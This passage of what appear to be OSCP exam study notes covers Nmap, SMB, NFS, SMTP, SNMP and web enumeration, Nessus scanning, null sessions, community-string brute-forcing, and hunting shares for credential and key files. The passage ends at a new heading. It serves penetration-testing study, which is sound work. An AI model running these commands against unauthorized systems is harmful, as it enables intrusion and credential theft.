```
nmap --script <script> <target>
```

---

## 2. NSE Script Categories

|Category|Purpose|
|---|---|
|`auth`|Authentication-related checks|
|`broadcast`|Network discovery|
|`brute`|Brute-force attacks|
|`default`|Default enumeration scripts|
|`discovery`|Information discovery|
|`dos`|Denial-of-Service testing|
|`exploit`|Exploitation|
|`external`|Uses external services|
|`intrusive`|More intrusive checks|
|`safe`|Generally safe scripts|
|`vuln`|Vulnerability detection|

---

## 3. Default NSE Scripts

```
nmap -sC <target>
```

Equivalent to:

```
nmap --script=default <target>
```

`-sC` runs the **default NSE scripts**.

These can provide useful information such as:

- Service information
- HTTP information
- SMB information
- SSH details
- FTP information
- SSL/TLS information
- Hostnames
- Network-related information

### OSCP Tip

A very common scan is:

```
nmap -sCV <target>
```

This combines:

```
-sC → Default NSE scripts
-sV → Service/version detection
```

---

## 4. Service Enumeration

The goal of service enumeration is to determine:

```
Port
 ↓
Service
 ↓
Version
 ↓
Configuration
 ↓
Potential Attack Surface
```

### Service Version Detection

```
nmap -sV <target>
```

Example:

```
22/tcp   open  ssh      OpenSSH 8.2
80/tcp   open  http     Apache httpd 2.4.41
445/tcp  open  microsoft-ds
```

`-sV` attempts to identify:

- Service name
- Service version
- Sometimes additional service information

---

## 5. Version Detection Intensity

You can increase the number of probes Nmap uses:

```
nmap -sV --version-intensity 9 <target>
```

The range is:

```
0 → 9
```

Higher values generally mean:

> More probes → potentially better identification → more traffic/time

---

## 6. OS Detection

Nmap can attempt to identify the target operating system:

```
nmap -O <target>
```

Example:

```
OS details:
Linux 5.x
```

Nmap uses **TCP/IP stack fingerprinting** to make an OS guess.

### OS + Service Detection

```
nmap -O -sV <target>
```

---

## 7. Privileged OS Detection

Some Nmap techniques work better with elevated privileges.

For example:

```
sudo nmap -O <target>
```

If you are already root:

```
nmap -O <target>
```

This can allow Nmap to use techniques that require raw packet access.

---

## 8. Aggressive Scan

```
nmap -A <target>
```

`-A` enables several advanced detection features, including:

```
OS Detection
Service Version Detection
Default NSE Scripts
Traceroute
```

Conceptually:

```
nmap -O -sV -sC --traceroute <target>
```

### OSCP Tip

`-A` is convenient, but during manual enumeration it can be useful to run individual options so you know exactly what each scan is doing.

---

## 9. Useful NSE Examples

## HTTP Enumeration

```
nmap --script http-enum -p80,443 <target>
```

Can help identify:

- Common directories
- Interesting files
- Web applications
- Known HTTP paths

---

## SMB Enumeration

```
nmap --script smb-enum* -p445 <target>
```

Can provide information about SMB.

### SMB Vulnerability Checks

```
nmap --script smb-vuln* -p445 <target>
```

---

## FTP Enumeration

```
nmap --script ftp-* -p21 <target>
```

---

## DNS Scripts

```
nmap --script dns-* -p53 <target>
```

> Be careful with wildcards because they may execute multiple scripts.

---

## 10. Finding NSE Scripts

NSE scripts are commonly located at:

```
/usr/share/nmap/scripts/
```

List them:

```
ls /usr/share/nmap/scripts/
```

Search for SMB-related scripts:

```
grep -i "smb" /usr/share/nmap/scripts/script.db
```

---

## 11. Get Help for an NSE Script

Before running an unfamiliar script:

```
nmap --script-help <script>
```

Example:

```
nmap --script-help http-enum
```

This is useful for understanding:

- What the script does
- Which category it belongs to
- Arguments/options
- Whether it performs intrusive actions

---

## 12. Vulnerability Detection

Nmap has a `vuln` NSE category.

```
nmap --script vuln <target>
```

You can also target specific ports:

```
nmap --script vuln -p80,443 <target>
```

### Important

Nmap reporting a potential vulnerability **does not automatically mean the vulnerability is exploitable**.

Think:

```
Nmap Detection
      ↓
Potential Vulnerability
      ↓
Manual Verification
      ↓
Exploit / Impact Validation
```

---

## 13. `-sC` vs `--script vuln`

### `-sC`

```
nmap -sC <target>
```

Runs the **default NSE scripts**.

Primary purpose:

> **Enumeration**

---

### `--script vuln`

```
nmap --script vuln <target>
```

Runs scripts designed for:

> **Vulnerability detection**

---

## 14. Practical OSCP Enumeration Workflow

### Step 1 — Discover Ports

```
nmap -Pn -p- <target>
```

This scans all TCP ports.

---

### Step 2 — Identify Services and Versions

After finding the open ports:

```
nmap -Pn -sCV -p<PORTS> <target>
```

Example:

```
nmap -Pn -sCV -p22,80,445 <target>
```

---

### Step 3 — OS Detection

```
sudo nmap -Pn -O -p<PORTS> <target>
```

---

### Step 4 — Targeted NSE

Once you know what services are running:

```
nmap -Pn --script <relevant-script> -p<PORT> <target>
```









# ==SMB & Netbios Enumeration==
![[netstat3.png]]
## 1. Overview

**SMB (Server Message Block)** is a network protocol commonly used for:

- File and printer sharing
- Windows administrative services
- Remote access
- Inter-process communication
- Authentication

**NetBIOS** is an older Windows networking interface commonly associated with SMB.

Common ports:

|Port|Protocol|Purpose|
|---|---|---|
|**139/TCP**|NetBIOS Session Service|SMB over NetBIOS|
|**445/TCP**|SMB|Direct-hosted SMB|
|**137/UDP**|NetBIOS Name Service|Name resolution|
|**138/UDP**|NetBIOS Datagram Service|Datagram communication|

> **OSCP priority:** TCP **445** is usually the most important SMB port. If 139 is open, enumerate NetBIOS as well.

---

## 2. Initial Enumeration

Start with Nmap:

```
nmap -Pn -p 139,445 <TARGET>
```

More detailed:

```
nmap -Pn -p 139,445 -sC -sV <TARGET>
```

SMB-specific NSE scripts:

```
nmap -Pn -p 139,445 --script smb-* <TARGET>
```

Useful scripts include:

```
smb-os-discovery
smb-protocols
smb-security-mode
smb-enum-shares
smb-enum-users
smb2-security-mode
smb2-time
```

Example:

```
nmap -Pn -p445 --script smb-os-discovery,smb-protocols,smb-security-mode <TARGET>
```

---

## 3. NetBIOS Enumeration

If **139** or UDP **137** is available, enumerate NetBIOS.

### nbtscan

```
nbtscan <TARGET>
```

For a subnet:

```
nbtscan 192.168.1.0/24
```

Can reveal information such as:

- NetBIOS computer name
- Workgroup/domain
- Registered names
- MAC address

---

### Nmap NetBIOS

```
nmap -Pn -p137 --script nbstat <TARGET>
```

Example:

```
nmap -Pn -sU -p137 --script nbstat <TARGET>
```

`-sU` is important because **137/UDP** is a UDP service.

---

## 4. SMB Null Session

A **null session** means connecting to SMB without valid credentials.

Test with:

```
smbclient -L //<TARGET> -N
```

`-L` → list shares  
`-N` → don't ask for a password

Another useful command:

```
rpcclient -U "" -N <TARGET>
```

If successful:

```
rpcclient $>
```

You may be able to enumerate information depending on the server configuration.

---

## 5. Enumerating SMB Shares

### smbclient

List shares:

```
smbclient -L //<TARGET> -N
```

Connect to a share:

```
smbclient //<TARGET>/<SHARE> -N
```

With credentials:

```
smbclient //<TARGET>/<SHARE> -U username
```

Inside `smbclient`:

```
ls
cd <directory>
get <file>
put <file>
pwd
```

Download a file:

```
get config.txt
```

---

## 6. Mounting SMB Shares

Linux can mount SMB shares directly.

```
sudo mount -t cifs //<TARGET>/<SHARE> /mnt/share
```

With credentials:

```
sudo mount -t cifs //<TARGET>/<SHARE> /mnt/share \
  -o username=user,password=password
```

Then:

```
ls -la /mnt/share
```

Unmount:

```
sudo umount /mnt/share
```

---

## 7. enum4linux

One of the classic OSCP SMB enumeration tools:

```
enum4linux <TARGET>
```

More aggressive enumeration:

```
enum4linux -a <TARGET>
```

Useful options:

```
enum4linux -U <TARGET>
```

Enumerate users.

```
enum4linux -S <TARGET>
```

Enumerate shares.

```
enum4linux -G <TARGET>
```

Enumerate groups.

```
enum4linux -P <TARGET>
```

Password-policy information.

### enum4linux-ng

Modern alternative:

```
enum4linux-ng <TARGET>
```

---

## 8. rpcclient

Connect:

```
rpcclient -U "" -N <TARGET>
```

Common enumeration commands:

```
srvinfo
enumdomusers
enumdomgroups
querydominfo
netshareenum
getdompwinfo
```

Example:

```
rpcclient $> enumdomusers
```

Potential output:

```
user:[Administrator]
user:[Guest]
user:[john]
user:[backup]
```

These usernames can become useful for later authentication testing.

---

## 9. SMB Version / Protocol Enumeration

Check supported SMB protocols:

```
nmap -Pn -p445 --script smb-protocols <TARGET>
```

You may see:

```
SMBv1
SMBv2
SMBv2.1
SMBv3
```

### Why SMBv1 matters

SMBv1 is old and insecure compared with modern SMB versions.

If SMBv1 is enabled, investigate the target for known vulnerabilities and configuration weaknesses.

---

## 10. SMB Security Configuration

Check SMB security mode:

```
nmap -Pn -p445 --script smb-security-mode <TARGET>
```

For SMB2:

```
nmap -Pn -p445 --script smb2-security-mode <TARGET>
```

Look for:

- Message signing
- Authentication requirements
- Guest access
- SMB protocol versions

---

## 11. SMB Signing

Check:

```
nmap -Pn -p445 --script smb2-security-mode <TARGET>
```

Example:

```
Message signing enabled but not required
```

This is important because **SMB signing not being required** can increase the risk of certain relay attacks.

### OSCP mindset

Don't immediately treat:

```
Signing: disabled/not required
```

as an exploit.

Instead:

**Finding → identify attack possibility → verify → determine impact.**

---

## 12. SMB User Enumeration

Try:

```
enum4linux -U <TARGET>
```

Or:

```
rpcclient -U "" -N <TARGET>
```

Then:

```
enumdomusers
```

Nmap:

```
nmap -Pn -p445 --script smb-enum-users <TARGET>
```

Potentially useful usernames:

```
administrator
admin
backup
service
developer
john
```

These can help with later authentication testing.

---

## 13. Share Enumeration

Nmap:

```
nmap -Pn -p445 --script smb-enum-shares <TARGET>
```

enum4linux:

```
enum4linux -S <TARGET>
```

smbclient:

```
smbclient -L //<TARGET> -N
```

Pay special attention to shares such as:

```
IPC$
ADMIN$
C$
SYSVOL
NETLOGON
backup
public
development
shared
```

---

## 14. Interesting Files

Once you gain access to a share, look for:

### Configuration

```
*.conf
*.config
*.ini
*.xml
```

### Credentials

```
password
passwd
credentials
creds
```

### Scripts

```
*.bat
*.cmd
*.ps1
*.vbs
```

### Backups

```
*.bak
*.old
*.backup
*.zip
*.7z
```

### Keys

```
*.pem
*.key
*.ppk
```

---

## 15. SYSVOL & NETLOGON

On a domain environment, pay particular attention to:

```
SYSVOL
NETLOGON
```

These may contain:

- Group Policy information
- Login scripts
- Configuration files
- Domain-related information
- Historically, credentials stored in scripts/configurations

Example:

```
smbclient //<TARGET>/SYSVOL -N
```

or:

```
smbclient //<TARGET>/NETLOGON -N
```

---

## 16. CrackMapExec / NetExec

Modern environments commonly use **NetExec**.

Basic SMB enumeration:

```
nxc smb <TARGET>
```

Enumerate shares:

```
nxc smb <TARGET> --shares
```

With credentials:

```
nxc smb <TARGET> -u username -p password --shares
```

Enumerate users where supported:

```
nxc smb <TARGET> -u username -p password --users
```

Check whether credentials work:

```
nxc smb <TARGET> -u username -p password
```

---

## 17. SMB Enumeration Workflow

A good OSCP workflow:

```
        ┌───────────────┐
        │ Port Scanning │
        └───────┬───────┘
                │
          139 / 445 open?
                │
        ┌───────▼───────┐
        │ SMB Detection │
        └───────┬───────┘
                │
       ┌────────┴────────┐
       │                 │
       ▼                 ▼
 NetBIOS 137         SMB 445
       │                 │
       ▼                 ▼
   nbstat            SMB version
       │             security mode
       │                 │
       └────────┬────────┘
                ▼
          Enumerate Shares
                │
                ▼
          Null/Guest Access
                │
                ▼
         Enumerate Users
                │
                ▼
        Access Interesting Shares
                │
                ▼
       Search Files / Credentials
                │
                ▼
       Identify Attack Surface
```

---

## 18. Quick Command Cheat Sheet

### Scan

```
nmap -Pn -p139,445 -sC -sV <TARGET>
```

### SMB scripts

```
nmap -Pn -p445 --script smb-* <TARGET>
```

### NetBIOS

```
nbtscan <TARGET>
```

```
nmap -Pn -sU -p137 --script nbstat <TARGET>
```

### List shares

```
smbclient -L //<TARGET> -N
```

### Connect

```
smbclient //<TARGET>/<SHARE> -N
```

### enum4linux

```
enum4linux -a <TARGET>
```

### RPC

```
rpcclient -U "" -N <TARGET>
```

### SMB protocols

```
nmap -Pn -p445 --script smb-protocols <TARGET>
```

### SMB signing

```
nmap -Pn -p445 --script smb2-security-mode <TARGET>
```

### NetExec

```
nxc smb <TARGET>
nxc smb <TARGET> --shares
```

---

## 19. What to Record During OSCP

When you discover SMB, record:

```
[+] Host
[+] Hostname
[+] Domain / Workgroup
[+] SMB version
[+] NetBIOS name
[+] SMB signing status
[+] Available shares
[+] Anonymous/Guest access
[+] Users
[+] Groups
[+] Interesting files
[+] Credentials/secrets discovered
[+] OS information
[+] Potential vulnerabilities
```

### OSCP Key Idea

Don't stop at:

> **445 is open.**

Think:

> **What does SMB reveal about this machine, what can I access anonymously, what shares exist, what users exist, and what information can lead to another attack path?**

**High-priority tools to memorize:** `nmap`, `smbclient`, `rpcclient`, `enum4linux-ng`, `nbtscan`, and `nxc`.




# ==NFS, SMTP & SNMP Enumeration==

![[1753182602326 1.jpeg]]
## 1. NFS Enumeration

**NFS (Network File System)** allows Linux/Unix systems to share directories over a network.

### Important Ports

|Port|Protocol|Service|
|---|---|---|
|`2049`|TCP/UDP|NFS|
|`111`|TCP/UDP|RPC / `rpcbind`|

### Enumeration

Check RPC services:

```
nmap -p 111,2049 -sV <IP>
```

Enumerate NFS/RPC with NSE:

```
nmap -p 111,2049 --script=nfs* <IP>
```

Query RPC:

```
rpcinfo -p <IP>
```

List exported NFS shares:

```
showmount -e <IP>
```

Example:

```
Export list for 10.10.10.10:
/home        *
/backup      10.10.10.0/24
```

### Mount an NFS Share

Create a mount point:

```
mkdir /mnt/nfs
```

Mount:

```
sudo mount -t nfs <IP>:/home /mnt/nfs
```

For NFSv4:

```
sudo mount -t nfs -o vers=4 <IP>:/ /mnt/nfs
```

Check files:

```
ls -la /mnt/nfs
```

Unmount:

```
sudo umount /mnt/nfs
```

### What to Look For

When an NFS share is accessible, look for:

- SSH keys
- Configuration files
- Password files
- Backups
- Credentials
- User home directories
- Application source code
- Sensitive documents
- Writable directories

### OSCP Mindset

**NFS → exported directories → accessible files → credentials/keys → possible initial access or privilege escalation**

A particularly interesting configuration is an export accessible to `*` or a broad network range.

---

## 2. SMTP Enumeration

**SMTP (Simple Mail Transfer Protocol)** is used for sending email.

### Important Ports

|Port|Common Usage|
|---|---|
|`25`|SMTP|
|`465`|SMTPS|
|`587`|SMTP Submission|

### Basic Enumeration

```
nmap -p 25,465,587 -sV <IP>
```

SMTP NSE scripts:

```
nmap -p 25 --script=smtp* <IP>
```

Useful scripts include:

```
smtp-commands
smtp-enum-users
smtp-open-relay
smtp-ntlm-info
```

### Manual Connection

```
nc -nv <IP> 25
```

or:

```
telnet <IP> 25
```

You may receive something like:

```
220 mail.example.com ESMTP Postfix
```

Check supported commands:

```
EHLO attacker
```

Possible response:

```
250-mail.example.com
250-AUTH LOGIN PLAIN
250-STARTTLS
```

### User Enumeration

Some SMTP servers can reveal whether a username exists.

Historically useful commands:

```
VRFY username
```

and:

```
EXPN username
```

However, modern SMTP servers commonly disable these.

Nmap:

```
nmap -p 25 --script=smtp-enum-users <IP>
```

### SMTP Open Relay

An **open relay** allows unauthorized users to send mail through the server.

Check:

```
nmap -p 25 --script=smtp-open-relay <IP>
```

For OSCP, don't assume that finding SMTP automatically means there is an exploitable vulnerability.

### OSCP Mindset

SMTP enumeration can provide:

```
SMTP
 ↓
Hostname/domain information
 ↓
Supported commands/authentication
 ↓
Potential usernames
 ↓
Possible valid accounts
 ↓
Credentials / authentication attacks
```

Also pay attention to the SMTP banner because it may reveal:

- Mail server software
- Version
- Hostname
- Domain

---

## 3. SNMP Enumeration
![[Pasted image 20260909035521.png]]

**SNMP (Simple Network Management Protocol)** is used to monitor and manage network devices and servers.

### Important Ports

|Port|Protocol|
|---|---|
|`161`|UDP — SNMP queries|
|`162`|UDP — SNMP traps|

**SNMP is primarily UDP**, so remember to use UDP scanning.

```
nmap -sU -p 161 <IP>
```

Service detection:

```
nmap -sU -p 161 -sV <IP>
```

### SNMP Versions

|Version|Notes|
|---|---|
|SNMPv1|Older, community-string based|
|SNMPv2c|Common, community-string based|
|SNMPv3|Supports authentication/encryption|

The important OSCP target is often:

```
SNMPv1 / SNMPv2c
```

because they commonly use a **community string**.

Think of the community string roughly as a shared password used to access SNMP information.

Common example:

```
public
```

---

## SNMP Enumeration with `snmpwalk`

Basic:

```
snmpwalk -v2c -c public <IP>
```

If successful, you may retrieve a large amount of information.

Specific system information:

```
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1
```

System description:

```
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.1
```

System name:

```
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.5
```

---

## SNMP Enumeration with Nmap

```
nmap -sU -p 161 --script=snmp-info <IP>
```

SNMP scripts:

```
ls /usr/share/nmap/scripts/snmp*
```

Common useful ones:

```
snmp-info
snmp-interfaces
snmp-processes
snmp-sysdescr
snmp-win32-software
snmp-win32-services
```

Example:

```
nmap -sU -p 161 --script=snmp-info <IP>
```

---

## 4. SNMP OIDs

SNMP organizes information using **OIDs (Object Identifiers)**.

Example:

```
1.3.6.1.2.1.1.5
```

means the system's hostname/name in the standard MIB tree.

Important areas to remember:

```
1.3.6.1.2.1.1
        │
        └── System information

1.3.6.1.2.1.2
        │
        └── Network interfaces

1.3.6.1.2.1.25
        │
        └── Host resources
```

SNMP can potentially expose:

- Hostname
- OS information
- Network interfaces
- IP addresses
- Running processes
- Installed software
- System information
- Users/configuration depending on the implementation

---

## 5. SNMP Brute-Force Community Strings

A common OSCP situation is discovering the community string.

Tools such as `onesixtyone` can test a wordlist:

```
onesixtyone -c community.txt <IP>
```

Example wordlist:

```
public
private
manager
```

If you discover:

```
10.10.10.10 [public]
```

try:

```
snmpwalk -v2c -c public 10.10.10.10
```

---

## Quick OSCP Workflow

```
                 ┌── NFS ──→ 111 / 2049
                 │
Target ──────────┼── SMTP ─→ 25 / 465 / 587
                 │
                 └── SNMP ─→ 161 UDP
```

### NFS

```
nmap -p 111,2049 -sV <IP>
rpcinfo -p <IP>
showmount -e <IP>
```

Then:

```
mount -t nfs <IP>:/share /mnt/nfs
```

**Goal:** Find exposed files, credentials, keys, backups, writable locations.

### SMTP

```
nmap -p 25,465,587 -sV <IP>
nmap -p 25 --script=smtp* <IP>
nc -nv <IP> 25
```

**Goal:** Identify mail server, hostname/domain, users, authentication methods, and possible misconfigurations.

### SNMP

```
nmap -sU -p 161 -sV <IP>
nmap -sU -p 161 --script=snmp-info <IP>
onesixtyone -c community.txt <IP>
snmpwalk -v2c -c public <IP>
```

**Goal:** Extract system/network information, processes, software, interfaces, and potentially sensitive configuration.

---

##  What to Memorize for OSCP

|Service|Port|First Things to Try|Main Goal|
|---|---|---|---|
|**NFS**|`2049`|`showmount -e`|Find exposed shares|
|**RPC**|`111`|`rpcinfo -p`|Discover RPC/NFS services|
|**SMTP**|`25`|`smtp*`, `nc`|Enumerate server/users|
|**SMTPS**|`465`|Nmap|Identify secure SMTP|
|**Submission**|`587`|Nmap|Identify mail submission|
|**SNMP**|`161/UDP`|`snmpwalk`, `onesixtyone`|Extract system information|
|**SNMP Trap**|`162/UDP`|Nmap|Identify trap service|

### The big OSCP lesson

**Don't just identify the service. Ask: _What information does this service give me that I can use for the next step?_**

For example:

```
NFS
 ↓
/home/user
 ↓
.ssh/id_rsa
 ↓
SSH access
```

or:

```
SNMP
 ↓
Hostname + users + interfaces + processes
 ↓
Better understanding of target
 ↓
Discover another attack path
```

or:

```
SMTP
 ↓
Valid usernames
 ↓
Username list
 ↓
Authentication attack / credential discovery
```


# ==Vulnerability Scanning==
![[6356308.png]]
## Frist
![[Pasted image 20260909051636.png]]
## 1. What is Vulnerability Scanning?

**Vulnerability scanning** is the process of automatically identifying potential security weaknesses in a target.

It can detect:

- Outdated software
- Known CVEs
- Missing patches
- Vulnerable services
- Weak configurations
- Exposed services
- Default credentials
- SSL/TLS weaknesses

```
Target
  ↓
Discover hosts & services
  ↓
Identify software/versions
  ↓
Compare against known vulnerabilities
  ↓
Review findings
  ↓
Manually verify
  ↓
Exploit if applicable
```

---

## 2. Main Vulnerability Scanners

Common tools:

|Tool|Main Use|
|---|---|
|**Nessus**|General vulnerability scanning|
|**OpenVAS / Greenbone**|Vulnerability assessment|
|**Nmap NSE**|Service/vulnerability enumeration|
|**Nuclei**|Template-based vulnerability scanning|
|**Nikto**|Web server checks|
|**WPScan**|WordPress vulnerability scanning|

---

## 3. Vulnerability Scanning vs Enumeration

### Enumeration

Answers:

> **"What is running?"**

Example:

```
22/tcp   SSH
80/tcp   HTTP
445/tcp  SMB
```

### Vulnerability Scanning

Answers:

> **"Does what is running have known weaknesses?"**

Example:

```
Apache 2.4.x
        ↓
Known CVE
        ↓
Potentially vulnerable
```

---

## 4. Typical Pentesting Workflow

```
1. Host Discovery
       ↓
2. Port Scanning
       ↓
3. Service Enumeration
       ↓
4. Vulnerability Scanning
       ↓
5. Manual Verification
       ↓
6. Exploitation
       ↓
7. Privilege Escalation
```

Common tools:

```
Nmap → Enumeration
Nessus/OpenVAS → Vulnerability Assessment
Nuclei → Automated Template Scanning
Manual testing → Verification
```

---

## 5. Important: Scanner ≠ Exploit

A scanner finding does **not** automatically mean you have a working exploit.

For example:

```
Scanner:
Apache may be vulnerable to CVE-XXXX
```

You still need to determine:

```
Is the version actually affected?
        ↓
Is the required configuration present?
        ↓
Is the vulnerability remotely exploitable?
        ↓
Can it provide useful impact?
```

---

## 6. False Positives

Vulnerability scanners can report vulnerabilities incorrectly.

Always verify important findings manually.

```
Scanner Finding
      ↓
Check Version
      ↓
Check Configuration
      ↓
Check CVE Conditions
      ↓
Manual Verification
```

---

## 7. Credentialed vs Non-Credentialed Scanning

### Non-Credentialed

Scanner accesses the target like an external user.

Can identify:

```
Open ports
Services
Versions
Network-accessible vulnerabilities
```

### Credentialed

Scanner has valid credentials and can inspect the system internally.

Can identify additional issues such as:

```
Missing patches
Installed vulnerable packages
Local configuration problems
Security settings
```

**Credentialed scans generally provide deeper visibility.**

---

## 8. Vulnerability Information

A scanner finding commonly contains:

```
Vulnerability name
CVE
CVSS
Affected software
Affected version
Port/service
Description
Evidence
Remediation
```

Example:

```
Service: SMB
Port: 445
Vulnerability: CVE-XXXX-XXXX
Severity: High
```

---

## 9. Severity

Typical classifications:

```
Critical
High
Medium
Low
Informational
```

Don't blindly prioritize only by severity.

Consider:

```
Severity
+
Exploitability
+
Attack surface
+
Required privileges
+
Potential impact
```

---

## 10. OSCP Mindset

For OSCP-style labs, don't spend all your time waiting for a scanner to tell you what to do.

Learn to reason from enumeration:

```
Open Port
   ↓
Service
   ↓
Version
   ↓
Technology
   ↓
Potential Vulnerability
   ↓
Research
   ↓
Manual Verification
   ↓
Exploit
```

### Golden rule

> **Enumeration tells you what exists. Vulnerability scanning tells you what may be vulnerable. Manual verification tells you what is actually exploitable.**
## 1. What is Nessus?

**Nessus** is a vulnerability scanner used to automatically identify:

- Vulnerabilities / CVEs
- Outdated software and services
- Missing security patches
- Misconfigurations
- Weak/default credentials
- Exposed services
- SSL/TLS issues
- Common network vulnerabilities

> **OSCP mindset:** Nessus is primarily an **enumeration and vulnerability discovery tool**, not an exploitation tool.

---

## 2. Where Nessus Fits in Pentesting

Typical workflow:

```
Nmap
  ↓
Discover open ports & services
  ↓
Nessus
  ↓
Identify potential vulnerabilities
  ↓
Manual verification
  ↓
Exploit
  ↓
Privilege Escalation
```

Nessus can save time by pointing you toward potential vulnerabilities, but you should **verify findings manually**.

---

## 3. Basic Nessus Scan

From the Nessus web interface:

```
New Scan
   ↓
Basic Network Scan
   ↓
Target: IP / subnet / hostname
   ↓
Launch
```

Example target:

```
192.168.1.10
```

or:

```
192.168.1.0/24
```

---

## 4. Important Scan Types

### Basic Network Scan

General-purpose vulnerability scan.

Useful for:

```
Servers
Workstations
Network devices
Web servers
```

### Advanced Scan

Provides more control over:

- Discovery
- Port scanning
- Performance
- Credentials
- Plugins
- Authentication

### Credentialed Scan

Nessus authenticates to the target and can inspect the system internally.

This generally provides much more accurate results.

For example, it can identify:

```
Missing Windows patches
Installed software versions
Local configuration problems
Missing Linux packages
```

### Non-Credentialed Scan

Nessus behaves more like an external attacker.

It primarily sees:

```
Open ports
Services
Service versions
Network-accessible vulnerabilities
```

---

## 5. Nessus Results

Findings are usually categorized by severity:

|Severity|Meaning|
|---|---|
|Critical|Extremely serious vulnerability|
|High|Significant security risk|
|Medium|Moderate risk|
|Low|Lower-risk issue|
|Informational|Useful enumeration / information|

**Important:** Severity does not automatically mean exploitability.

A `Critical` finding should still be investigated and validated.

---

## 6. Useful Information From Nessus

A finding may reveal:

```
Target IP
Port
Protocol
Service
Software
Software version
CVE
CVSS score
Description
Evidence
Remediation
```

Example:

```
Target: 10.10.10.20
Port: 445
Service: SMB
Finding: SMB vulnerability
CVE: CVE-XXXX-XXXX
Severity: Critical
```

You can then investigate the vulnerability manually.

---

## 7. Nessus + Nmap

Don't think of Nessus as a replacement for Nmap.

### Nmap

Primarily:

```
Host discovery
Port scanning
Service enumeration
OS detection
NSE enumeration
```

### Nessus

Primarily:

```
Vulnerability discovery
Patch detection
Configuration auditing
CVE identification
Security checks
```

A useful OSCP workflow is:

```
Nmap
 ↓
Identify services
 ↓
Nessus
 ↓
Review vulnerabilities
 ↓
Research / verify
 ↓
Exploit manually
```

---

## 8. False Positives

Nessus can produce **false positives**.

For example:

```
Nessus:
Apache vulnerable to CVE-XXXX
```

Don't immediately assume:

```
Apache → vulnerable → exploit
```

Verify:

```
Version
↓
Patch level
↓
OS distribution
↓
Configuration
↓
Actual vulnerability conditions
```

---

## 9. Important OSCP Point

Nessus is useful for **finding attack paths**, but you should understand the underlying vulnerability.

For every interesting finding, ask:

```
What service is vulnerable?
Why is it vulnerable?
What version is affected?
What are the prerequisites?
Can I reproduce/verify it?
Can it lead to RCE?
Can it lead to privilege escalation?
```


# ==Web Application Enumeration== 
![[images (2).png]]
## 1. What Is Web Application Enumeration?

**Web application enumeration** is the process of identifying and understanding a web application's:

- Technologies
- Web server
- Frameworks/CMS
- Directories and files
- Virtual hosts
- APIs
- Authentication mechanisms
- Parameters
- Functionality
- Hidden endpoints
- Potential attack surface

The goal is to build a **map of the application before attempting exploitation**.

---

## 2. OSCP Web Enumeration Workflow

```
Port Scan
   ↓
Identify Web Service
   ↓
Manual Browsing
   ↓
Technology Fingerprinting
   ↓
HTTP Headers
   ↓
robots.txt / sitemap.xml
   ↓
Directory & File Enumeration
   ↓
Virtual Host Enumeration
   ↓
Parameter / API Enumeration
   ↓
CMS Enumeration
   ↓
Review Application Functionality
   ↓
Identify Attack Surface
```

---

## 3. Identify the Web Server

Start with Nmap:

```
nmap -sC -sV -p80,443 TARGET
```

Example:

```
80/tcp   open  http    Apache httpd 2.4.x
443/tcp  open  https   nginx
```

You want to determine:

```
Web Server
├── Apache
├── Nginx
├── IIS
└── Other
```

And the application technology:

```
PHP
ASP.NET
Java
Node.js
Python
Ruby
WordPress
Joomla
Drupal
```

---

## 4. HTTP Enumeration

### Curl

```
curl -I http://TARGET
```

Useful information may include:

```
Server:
X-Powered-By:
Location:
Set-Cookie:
Content-Type:
```

For more complete information:

```
curl -i http://TARGET
```

---

## 5. HTTPS Enumeration

Check HTTPS:

```
curl -k -I https://TARGET
```

Nmap:

```
nmap -p443 --script ssl-cert,ssl-enum-ciphers TARGET
```

Look for:

- Certificate names
- Alternative hostnames
- TLS configuration
- Redirects
- Different application behavior

Certificate information can sometimes reveal:

```
dev.example.com
staging.example.com
api.example.com
```

---

## 6. Technology Fingerprinting

Useful tools:

### WhatWeb

```
whatweb http://TARGET
```

Example:

```
Apache
PHP
WordPress
jQuery
Bootstrap
```

### Nmap

```
nmap -sV -p80,443 TARGET
```

### Browser

Inspect:

- Response headers
- Cookies
- HTML source
- JavaScript
- URLs
- Forms

---

## 7. Source Code Inspection

View source:

```
CTRL + U
```

Look for:

```
<script src="...">
<link href="...">
<form action="...">
<!-- comments -->
```

Interesting information can include:

```
/api/
/admin/
/login.php
/js/app.js
/config.js
```

Also search JavaScript files for endpoint names and configuration references.

---

## 8. robots.txt

Always check:

```
curl http://TARGET/robots.txt
```

Example:

```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /private/
```

**Important:** `robots.txt` is not an access-control mechanism.

It can accidentally reveal interesting paths.

---

## 9. sitemap.xml

Check:

```
curl http://TARGET/sitemap.xml
```

It can reveal URLs that aren't obvious from normal navigation.

---

## 10. Directory & File Enumeration

Use:

### Gobuster

```
gobuster dir -u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt
```

With extensions:

```
gobuster dir -u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,bak,html
```

### FFUF

```
ffuf -u http://TARGET/FUZZ \
-w wordlist.txt
```

Potential findings:

```
/admin/
/login/
/backup/
/uploads/
/api/
/dev/
/test/
/config/
```

---

## 11. Status Codes

Pay attention to:

| Code  | Meaning                 |
| ----- | ----------------------- |
| `200` | Resource exists         |
| `301` | Permanent redirect      |
| `302` | Temporary redirect      |
| `401` | Authentication required |
| `403` | Access forbidden        |
| `404` | Not found               |
| `405` | Method not allowed      |
| `500` | Server-side error       |

### Especially important

```
403 Forbidden
```

does **not necessarily mean the path doesn't exist**.

For example:

```
/admin → 403
```

can indicate that `/admin` exists but requires authorization or another condition.

---

## 12. Virtual Host Enumeration

Sometimes the main website isn't the entire attack surface.

You may have:

```
example.com
dev.example.com
test.example.com
admin.example.com
api.example.com
```

Gobuster:

```
gobuster vhost -u http://example.com \
-w subdomains.txt
```

FFUF:

```
ffuf -u http://example.com \
-H "Host: FUZZ.example.com" \
-w subdomains.txt
```

Always investigate discovered hosts individually.

---

## 13. API Enumeration

Look for:

```
/api/
/api/v1/
/api/v2/
/graphql
/swagger/
/swagger.json
/openapi.json
/docs
```

Check JavaScript:

```
/static/js/app.js
/js/main.js
```

Search for:

```
/api/
fetch(
axios
XMLHttpRequest
/graphql
```

An application that looks simple in the browser may have a much larger API attack surface.

---

## 14. Parameter Enumeration

Identify inputs such as:

```
?id=1
?page=2
?file=test
?url=http://...
?redirect=/login
?user=admin
```

Also inspect:

- GET parameters
- POST parameters
- JSON bodies
- Cookies
- Headers
- Path parameters

Example:

```
GET /product?id=10
```

The parameter:

```
id=10
```

may become an important part of later testing.

---

## 15. Authentication Enumeration

